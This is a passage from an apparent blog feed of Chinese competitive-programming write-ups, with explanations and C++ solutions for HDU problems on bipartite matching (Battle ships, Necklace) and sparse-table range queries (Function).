，因为小的数贡献大，而且小的数如果 +1 就会和后面相同。不过这里又会有一个问题，就是剩下的数是 $k$ ，而前面只有 $k-1$ 个数。。。那这时就要取一个数和这个 $k$ 加起来变成一个新的数，那么很显然要取 $2$ （为什么？）（Hint：结果的倍数）<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MOD=<span class="number">1e9</span>+<span class="number">7</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">1e5</span>;</div><div class="line">ll fac[MAX];</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">fpow</span><span class="params">(ll x,ll n)</span></span></div><div class="line">&#123;</div><div class="line">    ll res=<span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span> (n) &#123;</div><div class="line">        <span class="keyword">if</span> (n&amp;<span class="number">1</span>) &#123;</div><div class="line">            res=res*x%MOD;</div><div class="line">        &#125;</div><div class="line">        x=x*x%MOD;</div><div class="line">        n&gt;&gt;=<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    fac[<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;MAX;i++) &#123;</div><div class="line">        fac[i]=fac[i<span class="number">-1</span>]*i%MOD;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        ll n,ans;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;n);</div><div class="line">        <span class="keyword">if</span> (n==<span class="number">1</span>) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"1"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        ll x=<span class="built_in">sqrt</span>((n+<span class="number">1</span>)*<span class="number">2</span>);</div><div class="line">        <span class="keyword">if</span> (x*(x+<span class="number">1</span>)/<span class="number">2</span>&gt;n+<span class="number">1</span>) x--;</div><div class="line">        ll rem=n+<span class="number">1</span>-x*(x+<span class="number">1</span>)/<span class="number">2</span>;</div><div class="line">        <span class="keyword">if</span> (rem==x) &#123;</div><div class="line">            ans=fac[x]*fpow(<span class="number">2</span>,MOD<span class="number">-2</span>)%MOD*(x+<span class="number">2</span>)%MOD;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            ans=fac[x-rem]*fac[x+<span class="number">1</span>]%MOD*fpow(fac[x-rem+<span class="number">1</span>],MOD<span class="number">-2</span>)%MOD;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5093 Battle ships 二分图</title>
      <url>/blog/2016/10/26/hdu5093/</url>
      <content type="html"><![CDATA[<h3 id="Battle-ships"><a href="#Battle-ships" class="headerlink" title="Battle ships"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5093" target="_blank" rel="noopener">Battle ships</a></h3><p>做的时候能不能搜索想了半天。。。后来查了一下竟然是二分图经典模型。。。所以觉得应该记下来。。。</p><blockquote><p>题目大意：<br>在海上（*）放战舰，任意两个战舰不能出现在同一行或列，除非中间有冰山（＃）相隔。问最多放多少战舰。</p><p>解题思路：<br>现将行和列，以冰山（＃）为分隔，分割成多段。对于每一个可能放置的位置（*），将其所在的行和列的分段相连。表达的意思就是，这个点如果放置，那么相邻的同一区段（*、o）都不能再用。对<strong>按行分割</strong>和<strong>按列分割</strong>这两个点集做一次二分图匹配即可。<br><img src="http://img.blog.csdn.net/20141112003808399" alt=""></p></blockquote><p><a href="http://blog.csdn.net/wujysh/article/details/41017235" target="_blank" rel="noopener">参考资料</a></p><p>代码：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">2505</span>;</div><div class="line"><span class="keyword">struct</span> Edge &#123;</div><div class="line">    <span class="keyword">int</span> go,next;</div><div class="line">&#125; eg[N&lt;&lt;<span class="number">1</span>];</div><div class="line"><span class="keyword">char</span> mp[<span class="number">55</span>][<span class="number">55</span>];</div><div class="line"><span class="keyword">int</span> mx[<span class="number">55</span>][<span class="number">55</span>];</div><div class="line"><span class="keyword">bool</span> vis[N];</div><div class="line"><span class="keyword">int</span> res[N],last[N];</div><div class="line"><span class="keyword">int</span> tot;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">adde</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">    eg[++tot].go=y;</div><div class="line">    eg[tot].next=last[x];</div><div class="line">    last[x]=tot;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=last[u];i;i=eg[i].next) &#123;</div><div class="line">        <span class="keyword">int</span> &amp;v=eg[i].go;</div><div class="line">        <span class="keyword">if</span> (!vis[v]) &#123;</div><div class="line">            vis[v]=<span class="number">1</span>;</div><div class="line">            <span class="keyword">if</span> (!res[v]||dfs(res[v])) &#123;</div><div class="line">                res[v]=u;</div><div class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,m;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        <span class="keyword">int</span> nx=<span class="number">0</span>,ny=<span class="number">0</span>;tot=<span class="number">0</span>;</div><div class="line">        <span class="comment">//nx为按行分割的点数,ny为按列分割的点数,tot为邻接表边数.</span></div><div class="line">        <span class="built_in">memset</span>(last,<span class="number">0</span>,<span class="keyword">sizeof</span>(last));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,mp[i]);</div><div class="line">            <span class="keyword">int</span> f=<span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++) &#123;</div><div class="line">                <span class="keyword">if</span> (mp[i][j]==<span class="string">'*'</span>) &#123;</div><div class="line">                    <span class="keyword">if</span> (!f) &#123;</div><div class="line">                        mx[i][j]=++nx;</div><div class="line">                        f=<span class="number">1</span>;</div><div class="line">                    &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        mx[i][j]=nx;</div><div class="line">                    &#125;</div><div class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mp[i][j]==<span class="string">'#'</span>&amp;&amp;f==<span class="number">1</span>) &#123;</div><div class="line">                    f=<span class="number">0</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++) &#123;</div><div class="line">            <span class="keyword">int</span> f=<span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">                <span class="keyword">if</span> (mp[i][j]==<span class="string">'*'</span>) &#123;</div><div class="line">                    <span class="keyword">if</span> (!f) &#123;</div><div class="line">                        adde(mx[i][j],++ny);</div><div class="line">                        f=<span class="number">1</span>;</div><div class="line">                    &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        adde(mx[i][j],ny);</div><div class="line">                    &#125;</div><div class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mp[i][j]==<span class="string">'#'</span>&amp;&amp;f==<span class="number">1</span>) &#123;</div><div class="line">                    f=<span class="number">0</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">memset</span>(res,<span class="number">0</span>,<span class="keyword">sizeof</span>(res));</div><div class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=nx;i++) &#123;</div><div class="line">            <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</div><div class="line">            <span class="keyword">if</span> (dfs(i)) ans++;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5727 Necklace 全排列+二分图</title>
      <url>/blog/2016/10/13/hdu5727/</url>
      <content type="html"><![CDATA[<h3 id="Necklace"><a href="#Necklace" class="headerlink" title="Necklace"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5727" target="_blank" rel="noopener">Necklace</a></h3><p>题意：要用ｎ个阳石和ｎ个阴石来串一个项链（环），规定阳石旁边只能是阴石，阴石旁边只能是阳石，现在有 ｍ 对影响关系，x 号阳石与 y 号阴石相邻会使阳石变暗（照样可以用），问串这个项链最少让几个阳石变暗</p><p>题解：一看就是两个点集之间连边，瞬间想到二分图。但是后面其实并不好想。。。</p><p>首先发现 n 很小，即使是全排列的复杂度也能承受，那么我们可以枚举阴石的每一种排列，并且把<strong>阳石编号</strong>和<strong>阳石摆放位置</strong>作为两个点集匹配。用 $a[i]$ 表示第 $i$ 个阴石的编号，用 $g[i][j]$ 表示 $i$ 号阳石能否放在第 $j$ 个位置，这时就要考虑第 $i$ 个阴石和第 $i+1$ 个阴石对第 $i$ 个阳石是否有影响了，把没影响的连边，做一次二分图最大匹配，用 n-最大匹配 更新答案即可。<br>复杂度为 $O(N!\times N^{2})$ ，很容易TLE。。。<br>于是去查了查，发现有1个算法优化和2个常数优化。。。</p><ol><li>在环的意义下，其实只有 $(n-1)!$ 种排列，比如：<br><code>1  2  3 ... n</code><br><code>n  1  2 ... n-1</code><br><code>n-1  n  1 ... n-2</code><br>这几种排列的答案一定是相等的</li><li>ans=0 时已经找到最优解，可以直接退出</li><li>使用 <code>next_permutation()</code> 会比递归形式更快。</li></ol><p>加了这些优化以后跑得飞快，只要400+ms。。。代码：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">12</span>;</div><div class="line"><span class="keyword">int</span> a[N],b[N],link[N];</div><div class="line"><span class="keyword">int</span> g[N][N],mp[N][N];</div><div class="line"><span class="keyword">bool</span> used[N];</div><div class="line"><span class="keyword">int</span> n,m,ans;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> v=<span class="number">1</span>;v&lt;=n;v++)</div><div class="line">        <span class="keyword">if</span> (g[u][v]&amp;&amp;!used[v]) &#123;</div><div class="line">            used[v]=<span class="literal">true</span>;</div><div class="line">            <span class="keyword">if</span> (link[v]==<span class="number">-1</span>||dfs(link[v])) &#123;</div><div class="line">                link[v]=u;</div><div class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">hungary</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">    <span class="built_in">memset</span>(link,<span class="number">-1</span>,<span class="keyword">sizeof</span>(link));</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++) &#123;</div><div class="line">            g[i][j]=<span class="number">0</span>;</div><div class="line">            <span class="keyword">if</span> (j==n) &#123;</div><div class="line">                <span class="keyword">if</span> (!mp[i][a[j]]&amp;&amp;!mp[i][a[<span class="number">1</span>]]) g[i][j]=<span class="number">1</span>;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">if</span> (!mp[i][a[j]]&amp;&amp;!mp[i][a[j+<span class="number">1</span>]]) g[i][j]=<span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">        <span class="built_in">memset</span>(used,<span class="number">0</span>,<span class="keyword">sizeof</span>(used));</div><div class="line">        <span class="keyword">if</span> (dfs(i)) res++;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m)!=EOF) &#123;</div><div class="line">        <span class="keyword">if</span> (!n||!m) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"0"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) a[i]=i;</div><div class="line">        <span class="built_in">memset</span>(mp,<span class="number">0</span>,<span class="keyword">sizeof</span>(mp));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++) &#123;</div><div class="line">            <span class="keyword">int</span> x,y;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x,&amp;y);</div><div class="line">            mp[x][y]=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        ans=n;</div><div class="line">        <span class="keyword">do</span> &#123;</div><div class="line">            ans=min(ans,n-hungary());</div><div class="line">            <span class="keyword">if</span> (!ans) <span class="keyword">break</span>;</div><div class="line">        &#125; <span class="keyword">while</span> (next_permutation(a+<span class="number">2</span>,a+n+<span class="number">1</span>));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5875 Function ST+二分</title>
      <url>/blog/2016/10/11/hdu5875/</url>
      <content type="html"><![CDATA[<h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5875" target="_blank" rel="noopener">Function</a></h3><p>引理：<br>我们称 $X\ge M$ 时 $X\ mod\ M$ 为一次有效的取模，则 $X$ 在 $\lceil log_{2}X\rceil$ 次有效的取模后一定变为 0 。<br>简要说明：<br>考虑最坏情况，取 $M=\lfloor\frac{X}{2}\rfloor+1$ ，$X-&gt;\lfloor\frac{X-1}{2}\rfloor$<br>（当 $M’&gt;M$ 或 $M’&lt;M$ 时，$X$ 都会变得更小）</p><p>题解：<br>考虑到 $a[l]$ 有效取模次数是 $log$ 级别的，所以只需要快速找出下一次有效的取模<br>即，每次寻找不大于当前数的最靠左的数<br>可以二分右端点，并询问区间内最小的数<br>使用ST维护，预处理 $O(NlogN)$ ，询问 $O(1)$<br>取模 $O(logX)$ 次，二分 $O(logN)$ 次，rmq $O(1)$ ，每个case复杂度为 $O(M*logX*logN)$<br>ST好久没写。。。可能失败的二分也好久没写。。。T了好多好多次。。。代码：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">int</span> st[N][<span class="number">25</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">st_init</span><span class="params">(<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;(<span class="number">1</span>&lt;&lt;i)&lt;=n;i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j+(<span class="number">1</span>&lt;&lt;i)<span class="number">-1</span>&lt;=n;j++)</div><div class="line">            st[j][i]=min(st[j][i<span class="number">-1</span>],st[j+(<span class="number">1</span>&lt;&lt;(i<span class="number">-1</span>))][i<span class="number">-1</span>]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">st_query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> ((<span class="number">1</span>&lt;&lt;(k+<span class="number">1</span>))&lt;=r-l+<span class="number">1</span>) k++;</div><div class="line">    <span class="keyword">return</span> min(st[l][k],st[r-(<span class="number">1</span>&lt;&lt;k)+<span class="number">1</span>][k]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bsearch</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> lim)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> res=r+<span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span> (l&lt;=r) &#123;</div><div class="line">        <span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (st_query(l,m)&gt;lim) l=m+<span class="number">1</span>;</div><div class="line">        <span class="comment">//区间最小值大于当前值，即区间所有数大于当前值</span></div><div class="line">        <span class="keyword">else</span> r=m<span class="number">-1</span>,res=m;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,m;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;st[i][<span class="number">0</span>]);</div><div class="line">        st_init(n);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</div><div class="line">        <span class="keyword">while</span> (m--) &#123;</div><div class="line">            <span class="keyword">int</span> l,r;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;l,&amp;r);</div><div class="line">            <span class="keyword">int</span> res=st[l++][<span class="number">0</span>];</div><div class="line">            <span class="keyword">while</span> (l&lt;=r&amp;&amp;res) &#123;</div><div class="line">                l=bsearch(l,r,res);</div><div class="line">                <span class="keyword">if</span> (l&lt;=r) &#123;</div><div class="line">                    res%=st[l++][<span class="number">0</span>];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,res);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5728 PowMod 数论</title>
      <url>/blog/2016/10/05/hdu5728/</url>
